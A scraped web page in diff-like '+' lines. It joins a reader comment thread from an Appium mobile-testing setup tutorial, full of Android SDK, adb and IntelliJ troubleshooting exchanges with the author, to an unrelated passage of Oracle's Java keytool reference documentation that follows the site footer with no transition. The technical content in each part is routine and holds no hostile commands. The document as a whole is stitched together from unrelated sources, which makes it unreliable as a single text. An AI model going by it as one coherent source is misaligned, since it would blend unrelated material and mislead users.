+February 21, 2018 at 3:34 pm
+Thanks Ufuk. I hope I can but it really takes too much time. I am trying to create a global software testing blog from our country. But also some new blogs are coming with Turkish content. I am happy for that. :)
+
+Reply
+
+Siddharth
+April 5, 2018 at 4:53 pm
+Hi Onur,
+As appium going to release Java client 6, can you please share the codes for gesture handling like scroll,swipe,zoom,pinch,page scroll, swipe without using objects etc?
+
+Waiting for your response.
+
+Reply
+
+Onur Baskirt
+April 5, 2018 at 11:32 pm
+I am super busy Siddharth but I am so happy that Ahmet Samet Baltaci will prepare a document and we will share it on swtestacademy.com. :) Thanks Ahmet.
+
+Reply
+
+Onur Baskirt
+June 20, 2018 at 1:17 am
+Here is the article: http://www.swtestacademy.com/appium-mobile-actions-swipe-tap-press/
+
+Reply
+
+Rodrigo González
+May 15, 2018 at 5:13 pm
+Hi Onur:
+
+I have some issues trying to do the drag and drop.
+I’m not able to do that.
+Could you please help me?
+
+Reply
+
+Onur Baskirt
+May 15, 2018 at 5:31 pm
+Would you please try below code snippet?
+
+TouchAction action = new TouchAction(driver);
+action.longPress(elem1).waitAction(3000).moveTo(elem2).perform().release();
+
+Reply
+
+Onur Baskirt
+June 20, 2018 at 1:17 am
+http://www.swtestacademy.com/appium-mobile-actions-swipe-tap-press/
+
+Reply
+
+Satyasai Bhagavatula
+June 19, 2018 at 10:26 pm
+Hi Mr. Onur,
+
+While installing Android Studio, when I reached the “Verify Settings” step, the screenshot appears as below:
+Current Settings
+Setup Type
+Standard
+SDK Folder:
+C:\Users\automation\AppData\Local\Android\Sdk
+
+However, the “Verify Settings” page in your blog appears as follows:
+Current Settings
+C:\Users\onurb\AppData\Local\Android\Sdk
+
+Total Download Size: 1.07 GB
+SDK Components to Download:
+Android Emulator 239MB
+Android SDK Building –Tools 27.0.3 52.03MB
+Android SDK Platform 27 62.7MB
+Android SDK Platform Tools 4.52MB
+Android SDK Tools 149 MB
+Android Support Repository 339MB
+Google Repository 205MB
+
+Could you please explain if I may be doing something incorrectly causing this difference and if so, could you also please let me now what I need to do get the same information as in your document?
+
+Thanks in advance,
+Regards
+Sai
+
+Reply
+
+Satyasai Bhagavatula
+June 19, 2018 at 10:35 pm
+I also noticed that “Android API 28” is “Partially Installed”
+
+Reply
+
+Satyasai Bhagavatula
+June 20, 2018 at 12:24 am
+Hi Onur,
+
+I just noticed that the 2 comments I left have been removed by moderator. Since the queries I posted are related to issues I am facing while installing the Android Studio following the instructions in your blog, would you please let me know if you want me to post them again?
+
+Thanks and Regards
+Satyasai
+
+Reply
+
+Onur Baskirt
+June 20, 2018 at 1:08 am
+Hello Satyasai, I was sleeping, we did not remove them. I will check your problem and get back to you. Note: Comments are passing under moderation before publishing. That’s why you did not see your comments. ;)
+
+Reply
+
+Onur Baskirt
+June 20, 2018 at 1:16 am
+Please check here: https://stackoverflow.com/questions/4771895/android-sdk-manager-not-installing-components
+
+Your problem looks like a bit configurational and device related. Try to do a setup with administrative rights.
+
+Reply
+
+Satyasai Bhagavatula
+June 20, 2018 at 1:20 am
+Hi Onur,
+I think I resolved the issue by clearing the contents of the directory “C:\Users\automation\AppData\Local\Android\Sdk” and reinstalling.
+Regards
+Satyasai
+
+Reply
+
+Satyasai Bhagavatula
+June 20, 2018 at 4:59 am
+Hi Onur,
+Thank you so much for replying patiently to my queries. It is 1st time that I have seen blog authors take time to respond and that too so fast. Thanks also for pointing me to the stackoverflow site. Currently I am continuing with installing the 2 SDKs that did not get installed in the original, which I am doing individually – each taking hours. Thanks for sharing very clear and easy to follow instructions.
+Regards
+Satyasai
+
+Reply
+
+Onur Baskirt
+June 20, 2018 at 5:05 pm
+You are very welcome Satyasai.
+
+Reply
+
+Satyasai Bhagavatula
+June 20, 2018 at 3:07 pm
+Hello Onur,
+There is a small typo. The “-list” in the command “sdkmanager -list” needs to be “–list” with 2 dashes instead of 1 dash as in “sdkmanager –list”. I noticed the 2 dashes when I viewed the screenshot from close.
+Regards
+Satyasai
+
+Reply
+
+Onur Baskirt
+June 20, 2018 at 5:05 pm
+Great! I hope you did all the steps. Good luck!
+
+Reply
+
+mahsa
+August 13, 2018 at 5:27 am
+Thank you for your helpful tutorial, I have an error at the end of step-4 when I start a session, I see this message :
+An unknown serverside message…cannot the app package.
+I see the app in emulator close or somehow crashed!
+how can I solve this issue? thank you again
+
+Reply
+
+Onur Baskirt
+August 13, 2018 at 12:16 pm
+please check here: https://github.com/appium/appium-desktop/issues/327
+
+Reply
+
+mahsa
+August 24, 2018 at 5:51 am
+Thank you again, I have tried to connect with other APKs like calculator and it is ok. But still, I have that problem with IsinOlsun and my application. the error on appium server is :
+Encountered internal error running command: Error: Cannot start the ‘com.isinolsun.app’ application. Original error: Error executing adbExec. Original error: ‘Command ‘C\:\\Users\\naser\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe -P 5037 -s 0eebac319805 shell am start -W -n com.isinolsun.app/com.isinolsun.app.activities.OnBoarderActivity -S’ exited with code 4294967295′; Stderr: ‘Security exception: Permission Denial: starting Intent { flg=0x10000000 cmp=com.isinolsun.app/.activities.OnBoarderActivity } from null (pid=12948, uid=2000) not exported from uid 10139
+
+and from Inspector Session, I can not start and connect! Please Do advice me what should I do. Thank you again
+
+Reply
+
+mahsa
+September 10, 2018 at 11:57 am
+I Found my solution:
+
+install the latest version Appium v1.9.0
+Error was still there,
+..” Security exception: Permission Denial..”.
+and the solution was in this link:
+https://github.com/appium/appium/blob/master/docs/en/writing-running-appium/android/activity-startup.md
+in Command Prompt:
+adb shell am start -W -n com.isinolsun.app/com.isinolsun.app.activities.SplashActivity -S -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -f 0x10200000
+and done connected!
+
+Reply
+
+Onur Baskirt
+September 10, 2018 at 12:45 pm
+Great! Thanks Masha to share the solution.
+
+Reply
+
+ioslearner
+November 22, 2018 at 2:33 pm
+Thank you so much for this detailed steps on latest. Can you please help also with identification of elements ? There are so many pages related to XCUITest iOS app testing and finding elements using predicate strings / class. But there is no clue about how do we implement in our selenium java. Any help on this will save lots of time
+
+Reply
+
+Onur Baskirt
+November 22, 2018 at 5:33 pm
+For iOS testing I would like to suggest this page: http://www.swtestacademy.com/ios-testing-appium-java/
+
+Reply
+
+Sukhpreet Singh
+November 22, 2018 at 3:39 pm
+Hey could you please tell me why we are not able to download the sdk tools only form the andoid website which you had explain in
+http://www.swtestacademy.com/appium-start-guide/
+Thanks in advance
+
+Reply
+
+Onur Baskirt
+November 22, 2018 at 5:44 pm
+At that time we do not need to get all the things. That’s why SDK only version was enough.
+
+Reply
+
+Sukhpreet Singh
+November 27, 2018 at 4:13 pm
+Yes SDK only version is enough but where can we download this version as this version is no longer available on the android official site
+
+Thanks
+
+Reply
+
+Onur Baskirt
+November 27, 2018 at 9:24 pm
+Yes Sukhpreet, you are totally right. I could not find it anymore and that’s why I downloaded the full version and prepared a new article for this.
+
+Reply
+
+Lily
+November 28, 2018 at 10:43 am
+hi, here is the link to download android sdk version, https://dl.google.com/android/android-sdk_r24.4.1-windows.zip?hl=zh-cn﻿
+
+Reply
+
+Onur Baskirt
+November 28, 2018 at 11:01 am
+Thanks, Lily. Did you try this SDK version? And also how do you create an emulator with this without Android Studio installation? I would like to hear your experience. I thank you very much for your contribution.
+
+Reply
+
+Thomas Tai
+November 23, 2018 at 8:11 am
+Hi Onur,
+
+Great article! I tried following step by step on my Mac and got Appium installed (latest ver 1.8.2). I’ve also cloned the sample test project and fired it up in IntelliJ. It would start the İşin Olsun app on both virtual and physical devices, but timeout when waiting for UI element to become visible. I played around with the timeout value of the driver and increased to 1000sec, still the same. Looks like it is just not able to find any the UI elements at all. I have also try older versions of Appium included 1.3.1 which is used in your article. Still the same result. Am I missing anything? Thanks in advance!
+
+cheers,
+Thomas
+
+Reply
+
+Onur Baskirt
+November 24, 2018 at 1:44 am
+Hello Thomas, first thank you for your comment. I have not tried the latest Appium version. For the last 2-3 months, I am working on API automation. I highly suggest you try another application rather than IsinOlsun apk. In APK Pure you can find many apks. If the result is the same then we will talk again. For the İsinOlsun app please recheck the activities and try different activities for fire-up. Maybe the team has been changed some stuff in the app. I don’t know the latest status. I am not head of İsinOlsun IT team anymore. Thus, I don’t know the latest details.
+
+Reply
+
+Thomas Tai
+November 26, 2018 at 11:18 am
+Hi Onur,
+
+Thanks for getting back to me.
+I have finally made it working! I tried with other apps too and same error. So I googled a bit and found that it seems to be a bug introduced in the latest Appium. https://github.com/appium/appium/issues/10874.
+Finally I found that Appium Node.js ver 1.8.1 works perfectly for me.
+
+cheers,
+Thomas
+
+Reply
+
+Onur Baskirt
+November 26, 2018 at 1:58 pm
+Hi Thomas, I am happy to hear that you are on track. Thank you so much for letting know that bug with us.
+
+Cheers,
+Onur
+
+Reply
+
+Sukhpreet Singh
+November 27, 2018 at 4:12 pm
+Hi,
+I am getting issue while opening the uiautomatorview in console window
+
+This is the error which I got
+
+C:\Users\HR>uiautomateviewer
+‘uiautomateviewer’ is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\HR>uiautomatorviewer
+‘”C:\Users\HR\AppData\Local\Android\Sdk\tools\lib\\find_java64.exe” -s’ is not recognized as an internal or external command,
+operable program or batch file.
+
+ERROR: No suitable Java found. In order to properly use the Android Developer
+Tools, you need a suitable version of Java JDK installed on your system.
+We recommend that you install the JDK version of JavaSE, available here:
+http://www.oracle.com/technetwork/java/javase/downloads
+
+If you already have Java installed, you can define the JAVA_HOME environment
+variable in Control Panel / System / Avanced System Settings to point to the
+JDK folder.
+
+You can find the complete Android SDK requirements here:
+http://developer.android.com/sdk/requirements.html
+
+Please help as I am unable to continue with your article
+
+Thanks
+
+Reply
+
+Onur Baskirt
+November 27, 2018 at 9:46 pm
+Hi, you have to do below steps which are explained in the article:
+
+1) And then add ANDROID_HOME variable and its path should be Android SDK’s path. Also, check your JAVA_HOME variable. JAVA_HOME should equal to JAVA SDK’s path.
+
+2) Then, you need to add required Android tools and JAVA JRE paths to your system path as shown below.
+
+3) After that, check your settings and installations. Open a command prompt window and type “sdkmanager –list” command as shown below.
+
+Please do these settings carefully, restart your PC and run the command again. If you have a problem, then check your installation folders and do a proper installation.
+
+Reply
+
+paul o'mahony
+November 27, 2018 at 4:13 pm
+HI Onur,
+Great article that was easy to follow.
+I had been banging away trying to get the different components up and running.
+Your instructions offered great clarity.
+Mobile Automation here I come!
+
+Kind regards,
+
+Paul
+
+Reply
+
+Onur Baskirt
+November 27, 2018 at 9:38 pm
+Hi Paul, I am also glad to hear that. If you face any problem or If you have any suggestions, I would like to hear from you. Happy automating! :)
+
+Reply
+
+Sukhpreet
+November 27, 2018 at 9:49 pm
+Hi onur,
+
+Would you please tell me how to fix the following error
+
+C:\Users\HR>uiautomateviewer
+‘uiautomateviewer’ is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\HR>uiautomatorviewer
+‘”C:\Users\HR\AppData\Local\Android\Sdk\tools\lib\\find_java64.exe” -s’ is not recognized as an internal or external command,
+operable program or batch file.
+
+I have also set sdk variables in the system variable.
+
+Reply
+
+Onur Baskirt
+November 27, 2018 at 9:59 pm
+Please check below solutions:
+https://stackoverflow.com/questions/22180954/adt-bundle-cant-find-java
+
+https://superuser.com/questions/193873/what-is-the-path-for-jdk-on-windows-7-64-bit
+
+Depending on if you installed the 64-bit or 32-bit JDK it should be in:
+
+32-bit: C:\Program Files (x86)\Java\jdk1.6.0_21\bin
+64-bit: C:\Program Files\Java\jdk1.6.0_21\bin
+You should be able to edit your PATH environment variable to include that path.
+
+Reply
+
+Sukhpreet Singh
+November 28, 2018 at 3:48 pm
+Hi Onur,
+
+I am unable to install apk on my vertual device I got the following error
+While dragging the apk on my android virtual device
+
+“failed to start adb check settings to verify your chosen adb path is valid”
+
+Reply
+
+Onur Baskirt
+November 28, 2018 at 11:57 pm
+Hı Sukhpreet, please check this one: https://stackoverflow.com/questions/41337336/android-studio-failed-to-start-adb I hope it helps.
+
+Reply
+
+Siddarth
+December 14, 2018 at 11:18 am
+This is nice article ! but when you want to setup configuration for real device, you can also find step by step installation of appium on mac with real device configuration by following the link
+– https://techsouljours.blogspot.com/
+
+https://techsouljours.blogspot.com/2018/08/install-appium-on-mac.html
+
+Reply
+
+Onur Baskirt
+December 16, 2018 at 12:17 am
+Have a good blogging. :)
+
+Reply
+
+Jeevesh
+January 3, 2019 at 2:21 pm
+Hi Onur,
+
+I am facing a problem wherein I am not able to find the elements that are within a FrameLayout, so while I run the appium script using the resource id, I get No such element found exception. Can you please tell me how to address this issue, as I am stuck with this case since past 2 months.
+I am using appium 1.8.1 desktop
+Also tried using automation name as UiAutomator2 but still of no help.
+
+Reply
+
+Onur Baskirt
+January 5, 2019 at 12:43 am
+Hi, I hope this tactic will help: https://stackoverflow.com/questions/35378885/how-to-find-inner-elements-in-appium
+
+Reply
+
+Constantine
+February 19, 2019 at 12:21 pm
+Hi Onur,
+
+Thank you for your article, it helped me to set up my automation testing.
+I am facing a problem. I want to automate my test scenarios. How may I detect if my test scenario failed or passed?
+For example I am checking for user registration. when it finish I want to report in logs that registration finished successfully. How may I detect this?
+And one more question is how to restart test test scenario if application crashes?
+Appium 1.9.1.
+Python 3.7.2
+Work with real devices and emulators
+
+Reply
+
+Onur Baskirt
+February 19, 2019 at 10:37 pm
+https://medium.com/@ssaurel/how-to-auto-restart-an-android-application-after-a-crash-or-a-force-close-error-1a361677c0ce
+
+https://discuss.appium.io/t/how-to-generate-test-reports-in-appium/17513
+
+Reply
+
+dinesh
+March 18, 2019 at 9:03 pm
+Hi Onur,
+
+Thank you for such a great article.
+
+All your articles are very helpful.
+
+Reply
+
+Onur Baskirt
+March 18, 2019 at 10:46 pm
+Welcome Dear Dinesh for your kind and nice comment. I am happy that this article helps. :)
+
+Reply
+
+newman
+March 19, 2019 at 9:18 am
+Hi Onur,
+Thank you for such a great tutorial
+It’s very helpful.
+I am doing the last part “code opens İsinOlsun app”
+but i have no idea how to do
+I am new to Intellij IDEA
+Didn’t know how to link with appium
+
+Reply
+
+Onur Baskirt
+March 19, 2019 at 9:42 am
+You are welcome.
+Open the intelliJ and do the followings:
+
+Click New -> PRoject from Version Control -> Git
+
+Then copy and paste this URL: https://github.com/swtestacademy/appium-sample-test.git
+
+Then, sample project will open on IntelliJ. If you see, auto update maven indices just click ok. Maven will update the dependencies automatically.
+
+After these steps, run the test code. It may work but maybe will fail at clicking the second job because this app is not stable on the emulator.
+
+We are linking Appium and JAVA code with desired capabilities. You can find it also in the code. Like shown as follows:
+
+@BeforeMethod
+public void setup () throws MalformedURLException {
+DesiredCapabilities caps = new DesiredCapabilities();
+caps.setCapability(“deviceName”, “Galaxy Nexus API 24”);
+caps.setCapability(“udid”, “emulator-5554”); //DeviceId from “adb devices” command
+caps.setCapability(“platformName”, “Android”);
+caps.setCapability(“platformVersion”, “7.0”);
+caps.setCapability(“skipUnlock”,”true”);
+caps.setCapability(“appPackage”, “com.isinolsun.app”);
+caps.setCapability(“appActivity”,”com.isinolsun.app.activities.SplashActivity”);
+caps.setCapability(“noReset”,”false”);
+driver = new AndroidDriver(new URL(“http://127.0.0.1:4723/wd/hub”),caps);
+wait = new WebDriverWait(driver, 10);
+}
+
+Reply
+
+Newman
+March 19, 2019 at 9:58 am
+Thank you, Onur.
+I know how it works
+
+Reply
+
+Onur Baskirt
+March 19, 2019 at 1:52 pm
+Welcome :)
+
+Reply
+
+Newman
+March 19, 2019 at 9:56 am
+Feel sorry
+I saw another video then know how to use Intellij IDEA
+just like Android studio
+
+cheers
+Newman
+
+Reply
+
+Onur Baskirt
+March 19, 2019 at 1:52 pm
+Cheers, buddy!
+
+Reply
+
+Newman
+March 28, 2019 at 6:14 am
+Hi Onur
+I am new to Intellij IDEA, wonder that if i develop with community version will be okay?Cause i try to use community version to do the same thing, then find out there is no auto-import for maven project.
+
+Thanks
+Newman
+
+Reply
+
+Newman
+March 28, 2019 at 8:31 am
+ohhh..i get the answer
+just need to add libraries manually on website: central.maven.org
+
+sorry for disturbing
+
+Newman
+
+Reply
+
+Onur Baskirt
+March 28, 2019 at 11:22 am
+No worries. :)
+
+Reply
+
+Edward
+April 15, 2019 at 9:33 am
+Hi Onur,
+
+Can you post a tutorial on how to integrate Appium with the latest visual studio? I already have a project but I don’t know how to start integrating it to my visual studio.
+
+I already installed Appium desktop and Android studio and already connected it (I followed your steps above).
+
+Thanks in Advance!
+
+Reply
+
+Onur Baskirt
+April 16, 2019 at 10:55 pm
+Hi Edward,
+
+I suggest you this course: http://www.executeautomation.com/site/course/appium-automation-with-c/
+
+Reply
+
+Edward
+April 17, 2019 at 2:17 am
+Hi Onur,
+
+My bad, what I mean is Visual Studio Code.
+
+Reply
+
+Onur Baskirt
+April 17, 2019 at 11:46 am
+Oh I am using IntelliJ. I have visual studio code but I am not using it extensively.
+
+Reply
+
+Edward
+April 26, 2019 at 4:10 am
+Hi Onur,
+
+Why is intellij not recognizing these scripts?
+
+driver.findElement(By.xpath(“//*[@text=’Sign in’]”)).click();
+driver.findElement(By.xpath(“//*[@text=’Make a Payment’]”)).click();
+driver.findElement(By.xpath(“//*[@class=’android.view.View’ and ./*[@text=’From :’]]”)).click();
+driver.findElement(By.xpath(“//*[@class=’android.view.View’ and ./*[@text=’Everyday Offset’]]”)).click();
+driver.findElement(By.xpath(“//*[@class=’android.view.View’ and ./*[@text=’To:’]]”)).click();
+driver.findElement(By.xpath(“(//*[@class=’android.view.View’ and ./parent::*[@class=’android.view.View’ and ./parent::*[@class=’android.view.View’ and (./preceding-sibling::* | ./following-sibling::*)[@text=’Select Account’]] and (./preceding-sibling::* | ./following-sibling::*)[@class=’android.view.View’]]]/*[./*[@text=’A C Green – 138899729′]])[1]”)).click();
+driver.findElement(By.xpath(“//*[@class=’android.view.View’ and ./*[@text=’Amount:’]]”)).click();
+driver.findElement(By.xpath(“//*[@class=’android.widget.EditText’ and ./parent::*[(./preceding-sibling::* | ./following-sibling::*)[@text]]]”)).sendKeys(“12.25”);
+driver.findElement(By.xpath(“//*[@class=’android.view.View’ and ./*[@text=’Description:’]]”)).click();
+driver.findElement(By.xpath(“//*[@class=’android.widget.EditText’ and ./parent::*[./parent::*[./parent::*[./parent::*[(./preceding-sibling::* | ./following-sibling::*)[@text=’Description:’]]]]]]”)).sendKeys(“Test”);
+driver.findElement(By.xpath(“//*[@text=’Continue’]”)).click();
+driver.findElement(By.xpath(“//*[@text=’Make payment’]”)).click();
+
+
+Onur Baskirt
+April 27, 2019 at 11:25 pm
+I really don’t know. Better to ask them Edward. Would you kindly write a question on StackOverflow, please?
+
+
+Anmol
+April 15, 2019 at 3:18 pm
+Hi,
+
+I am getting this error. Kindly help!
+
+CMD command:
+
+C:\Users\anmolagarwal>sdkmanager -list
+Warning: File C:\Users\anmolagarwal\.android\repositories.cfg could not be loaded.
+Warning: Failed to find package -list
+
+And then when try to install the apk, it failes to install and gives this error –
+APK failed to install.
+Could not parse error string.
+
+Reply
+
+Onur Baskirt
+April 16, 2019 at 10:51 pm
+please try these.
+https://stackoverflow.com/questions/47028626/repositories-cfg-could-not-be-loaded-in-windows-10
+
+Reply
+
+Edward
+April 17, 2019 at 4:28 am
+Hi Onur,
+
+I’m getting this error. I copied your codes above.
+
+Apr. 17, 2019 11:23:14 AM io.appium.java_client.remote.AppiumCommandExecutor$1 lambda$0
+INFO: Detected dialect: W3C
+
+Reply
+
+Onur Baskirt
+April 17, 2019 at 11:50 am
+It may be a local problem. Better to investigate based on below links.
+
+https://discuss.appium.io/t/having-problems-running-script/23482
+
+https://sqa.stackexchange.com/questions/25367/selenium-webdriver-geckodriver-info-detected-dialect-w3c-error
+
+https://github.com/appium/appium/issues/10055
+
+Reply
+
+Edward
+April 18, 2019 at 4:31 am
+Thanks Onur,
+
+How can I find element with just a class and text element?
+
+Reply
+
+Onur Baskirt
+April 18, 2019 at 8:33 am
+Please check this article. https://www.swtestacademy.com/selenium-find-element/
+
+Reply
+
+Edward
+April 18, 2019 at 6:26 am
+Also, this command is now working on me:
+
+wait.until(ExpectedConditions.visibilityOfElementLocated
+(By.className(“android.widget.Button[@text=’Sign In’]”)));
+
+Reply
+
+Onur Baskirt
+April 18, 2019 at 8:35 am
+You need to put a breakpoint at that step. Then evaluate expressions that you are passing to find the problem and solution. By the way, maybe the app has been changed. You can try to write tests for other applications.
+
+Reply
+
+Ed
+April 26, 2019 at 5:31 am
+Hi Onur,
+
+How can I find element in a modal/pop-up? Appium seems not to find elements in there?
+
+Thanks!
+
+Reply
+
+Onur Baskirt
+April 27, 2019 at 11:27 pm
+Maybe u need to switch to the modal if it an alert. https://www.swtestacademy.com/selenium-webdriver-alerts/
+
+Reply
+
+Keith
+June 3, 2019 at 9:44 am
+Hi Onur
+I can’t leave any comment on this website
+
+Reply
+
+Onur Baskirt
+June 5, 2019 at 12:59 am
+I approved and now you can see it ;) All comments are passing approval process that’s why u did not see your comment immediately. ;)
+
+Reply
+
+Keith
+June 3, 2019 at 10:14 am
+ohhh… i can
+it so weird that i try couple times to leave comments but failed
+it’s very help , thank you Onur
+
+but I have a problem that doing parallel test on 2 devices
+
+like i have applicatio to login
+open app
+input email
+input password
+press login
+
+everything is fine until input password
+A mobile will do input password and press login twice, but B mobile do nothing
+Do you have idea about this?
+
+thank you
+Keith
+
+Reply
+
+Keith
+June 3, 2019 at 11:33 am
+hmm sorry Onur
+I redo your project again
+everything work fine
+I have no idea why.. so weird . Thank you again
+
+Reply
+
+Onur Baskirt
+June 5, 2019 at 12:58 am
+Happy to hear that Keith :)
+
+Reply
+
+Ron
+October 30, 2019 at 12:19 pm
+Nice, but what is the “RapiEE tool” used for?
+
+Reply
+
+Ron
+October 30, 2019 at 12:28 pm
+oh i know now, its for setting environment variables
+
+Reply
+
+Onur Baskirt
+October 31, 2019 at 9:11 am
+Yes you are right.
+
+Reply
+
+Ronwald
+October 30, 2019 at 1:06 pm
+can you pls create create a tutorial about testing web applications on mobile? thanks
+
+Reply
+
+Onur Baskirt
+October 31, 2019 at 9:12 am
+We were doing it by selenium by changing the user agent.https://www.swtestacademy.com/change-user-agent-selenium-webdriver/
+
+And with new Selenium version also provides some new features: https://www.swtestacademy.com/selenium-4-chrome-dev-tools-samples/
+
+Reply
+
+Kevin
+December 5, 2019 at 5:13 am
+Hi Onur,
+
+would like to ask for creating a sample project in android studio in the above, is it select the basic activity project type?
+
+Reply
+
+Onur Baskirt
+December 9, 2019 at 6:35 pm
+Hi Kevin,
+
+I did not get your question. I am sorry. “Select the basic activity type?”
+
+Reply
+
+Shivam
+December 14, 2019 at 4:57 pm
+Nice jobs!! keep work up!! Nice article
+
+Reply
+
+akhilesh
+February 12, 2020 at 10:21 pm
+Getting error when running android mobile application
+
+org.openqa.selenium.WebDriverException: An unknown server-side error occurred while processing the command. Original error: Could not find ‘adb.exe’ in PATH. Please set the ANDROID_HOME or ANDROID_SDK_ROOT environment variables to the corect Android SDK root directory path. (WARNING: The server did not provide any stacktrace information)
+Command duration or timeout: 672 milliseconds
+
+Reply
+
+Onur Baskirt
+February 14, 2020 at 2:40 pm
+It seems the problem is the Android SDK path definition.
+
+Reply
+
+TQNhi
+May 21, 2020 at 11:38 am
+Thanks for great article!
+
+But I have an error, when I run automation code, it just open the app on Android then close, do not proceed Click method, nothing happen at all.
+
+Reply
+
+Onur Baskirt
+May 24, 2020 at 10:53 pm
+MAybe app has been changed, I wrote it for a long time ago. When I will find time, I will update the article with an another app.
+
+Reply
+
+Cyrille
+November 3, 2021 at 5:14 pm
+THX for this tutorial.
+For information, I spend a lot of time on JRE/JDK library compatibility.
+I am realy not a JAVA expert and the execution of the sdkmanager always failed.
+Then I realise I have to pay attention to get exactly the same version number of JDK and JRE.
+
+Now I have a good environement, I have to make my first test.
+
+Reply
+
+Onur Baskirt
+November 4, 2021 at 11:43 am
+I am super happy to hear that! In appium automation, the first installations, versions compatibility, etc. are so crucial and I am so happy that this article helped you to have a stable and running appium automation environment. :)
+
+Reply
+Leave a Comment
+Comment
+
+Name
+Name *
+Email
+Email *
+Website
+Website
+ Notify me of followup comments via e-mail. You can also subscribe without commenting.
+
+This site uses Akismet to reduce spam. Learn how your comment data is processed.
+
+Agile Tutorials (5)
+Allure Report (2)
+Api Testing (7)
+Appium Tutorials (15)
+Cucumber Tutorials (2)
+DevOps Tutorials (38)
+Espresso Tutorials (2)
+Extent Reports (3)
+Gatling Tutorials (6)
+Interview Questions (1)
+Java Tutorials (36)
+JMeter Tutorials (12)
+JUnit Tutorials (13)
+Mobile Automation (3)
+Performance Testing (5)
+Programming Tutorials (34)
+Robot Framework (3)
+Security Testing Tutorials (2)
+Selenium Tutorials (58)
+Software Conferences (8)
+Test Automation (25)
+Test Masters (2)
+Test Reporting (4)
+Testing Tutorials (13)
+TestNG Tutorials (8)
+Tools and Technologies (16)
+UI Automation (1)
+Uncategorized (2)
+Visual Testing (6)
+Search for:
+Search …
+
+© 2021 SW TEST ACADEMY • ALL RIGHTS RESERVED
+Skip to Content
+Home PageJava SoftwareJava SE DownloadsJava SE 8 DocumentationSearch
+Java Platform, Standard Edition Tools Reference
+Contents    Previous    Next
+keytool
+Manages a keystore (database) of cryptographic keys, X.509 certificate chains, and trusted certificates.
+
+Synopsis
+keytool [commands]
+
+commands
+See Commands. These commands are categorized by task as follows:
+
+Create or Add Data to the Keystore
+
+-gencert
+
+-genkeypair
+
+-genseckey
+
+-importcert
+
+-importpassword
+
+Import Contents From Another Keystore
+
+-importkeystore
+
+Generate Certificate Request
+
+-certreq
+
+Export Data
+
+-exportcert
+
+Display Data
+
+-list
+
+-printcert
+
+-printcertreq
+
+-printcrl
+
+Manage the Keystore
+
+-storepasswd
+
+-keypasswd
+
+-delete
+
+-changealias
+
+Get Help
+
+-help
+
+Description
+The keytool command is a key and certificate management utility. It enables users to administer their own public/private key pairs and associated certificates for use in self-authentication (where the user authenticates himself or herself to other users and services) or data integrity and authentication services, using digital signatures. The keytool command also enables users to cache the public keys (in the form of certificates) of their communicating peers.
+
+A certificate is a digitally signed statement from one entity (person, company, and so on.), that says that the public key (and some other information) of some other entity has a particular value. (See Certificate.) When data is digitally signed, the signature can be verified to check the data integrity and authenticity. Integrity means that the data has not been modified or tampered with, and authenticity means the data comes from whoever claims to have created and signed it.
+
+The keytool command also enables users to administer secret keys and passphrases used in symmetric encryption and decryption (DES).
+
+The keytool command stores the keys and certificates in a keystore. See KeyStore aliases.
+
+Command and Option Notes
+See Commands for a listing and description of the various commands.
+
+All command and option names are preceded by a minus sign (-).
+
+The options for each command can be provided in any order.
+
+All items not italicized or in braces or brackets are required to appear as is.
+
+Braces surrounding an option signify that a default value will be used when the option is not specified on the command line. See Option Defaults. Braces are also used around the -v, -rfc, and -J options, which only have meaning when they appear on the command line. They do not have any default values other than not existing.
+
+Brackets surrounding an option signify that the user is prompted for the values when the option is not specified on the command line. For the -keypass option, if you do not specify the option on the command line, then the keytool command first attempts to use the keystore password to recover the private/secret key. If this attempt fails, then the keytool command prompts you for the private/secret key password.
+
+Items in italics (option values) represent the actual values that must be supplied. For example, here is the format of the -printcert command:
+
+keytool -printcert {-file cert_file} {-v}
+When you specify a -printcert command, replace cert_file with the actual file name, as follows: keytool -printcert -file VScert.cer
+
+Option values must be put in quotation marks when they contain a blank (space).
+
+The -help option is the default. The keytool command is the same as keytool -help.
+
+Option Defaults
+The following examples show the defaults for various option values.
+
+-alias "mykey"
+ 
+-keyalg
+    "DSA" (when using -genkeypair)
+    "DES" (when using -genseckey)
+ 
+-keysize
+    2048 (when using -genkeypair and -keyalg is "RSA")
+    1024 (when using -genkeypair and -keyalg is "DSA")
+    256 (when using -genkeypair and -keyalg is "EC")
+    56 (when using -genseckey and -keyalg is "DES")
+    168 (when using -genseckey and -keyalg is "DESede")
+ 
+-validity 90
+ 
+-keystore <the file named .keystore in the user's home directory>
+ 
+-storetype <the value of the "keystore.type" property in the
+    security properties file, which is returned by the static
+    getDefaultType method in java.security.KeyStore>
+ 
+-file
+    stdin (if reading)
+    stdout (if writing)
+ 
+-protected false
+In generating a public/private key pair, the signature algorithm (-sigalg option) is derived from the algorithm of the underlying private key:
+
+If the underlying private key is of type DSA, then the -sigalg option defaults to SHA256withDSA.
+
+If the underlying private key is of type RSA, then the -sigalg option defaults to SHA256withRSA.
+
+If the underlying private key is of type EC, then the -sigalg option defaults to SHA256withECDSA.
+
+For a full list of -keyalg and -sigalg arguments, see Java Cryptography Architecture (JCA) Reference Guide at
+http://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/CryptoSpec.html#AppA.
+
+Common Options
+The -v option can appear for all commands except -help. When the -v option appears, it signifies verbose mode, which means that more information is provided in the output.
+
+There is also a -Jjavaoption argument that can appear for any command. When the -Jjavaoption appears, the specified javaoption string is passed directly to the Java interpreter. This option does not contain any spaces. It is useful for adjusting the execution environment or memory usage. For a list of possible interpreter options, type java -h or java -X at the command line.
+
+These options can appear for all commands operating on a keystore:
+
+-storetype storetype
+This qualifier specifies the type of keystore to be instantiated.
+
+-keystore keystore
+The keystore location.
+
+If the JKS storetype is used and a keystore file does not yet exist, then certain keytool commands can result in a new keystore file being created. For example, if keytool -genkeypair is called and the -keystore option is not specified, the default keystore file named .keystore in the user's home directory is created when it does not already exist. Similarly, if the -keystore ks_file option is specified but ks_file does not exist, then it is created. For more information on the JKS storetype, see the KeyStore Implementation section in KeyStore aliases.
+
+Note that the input stream from the -keystore option is passed to the KeyStore.load method. If NONE is specified as the URL, then a null stream is passed to the KeyStore.load method. NONE should be specified if the keystore is not file-based. For example, when it resides on a hardware token device.
+
+-storepass[:env| :file] argument
+The password that is used to protect the integrity of the keystore.
+
+If the modifier env or file is not specified, then the password has the value argument, which must be at least 6 characters long. Otherwise, the password is retrieved as follows:
+
